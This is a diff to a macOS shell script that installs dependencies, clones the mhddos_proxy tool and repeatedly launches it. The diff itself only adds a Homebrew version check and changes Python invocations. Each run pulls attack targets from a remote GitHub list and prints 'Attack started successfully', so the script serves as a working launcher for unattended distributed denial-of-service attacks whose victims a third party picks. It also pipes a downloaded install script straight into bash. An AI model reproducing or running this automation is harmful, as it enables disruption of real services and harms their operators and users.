@@ -2,10 +2,19 @@
 
 set -e 
 
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+num=$(brew --version | grep -c "3.4.10")
+echo -e "$num"
+if ((num == 1));
+then	
+	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Brew is the latest version"
+else
+	/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+fi
+
+
 brew install coreutils git python@3.10
 brew link --overwrite python@3.10
-python3.10 -m pip install --upgrade setuptools
+python3 -m pip install --upgrade setuptools
 
 cd ~
 rm -rf auto_mhddos_mac
@@ -15,7 +24,7 @@ git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy || true
 cd ~/mhddos_proxy
 echo -e "\n\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling latest requirements...\033[0;0m\n\n"
 sleep 2
-python3.10 -m pip install -r requirements.txt
+python3 -m pip install -r requirements.txt
 
 restart_interval="1200"
 
@@ -82,7 +91,7 @@ do
 		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date mhddos_proxy"
 	else
 		cd ~/mhddos_proxy
-		python3.10 -m pip install -r requirements.txt
+		python3 -m pip install -r requirements.txt
 		clear
 		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated mhddos_proxy"
 		sleep 3
@@ -116,10 +125,10 @@ do
     	cmd_line=$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | grep "^[^#]" | awk "NR==$i")
            
     	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
-    	echo -e "python3 runner.py $cmd_line --rpc $rpc -t $threads $debug"
+    	echo -e "python3 runner.py $cmd_line --rpc $rpc -t $threads $vpn $debug"
             
     	cd ~/mhddos_proxy
-    	python3.10 runner.py $cmd_line --rpc $rpc -t $threads $vpn $debug&
+    	python3 runner.py $cmd_line --rpc $rpc -t $threads $vpn $debug&
 	PID="$!"
     	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
 
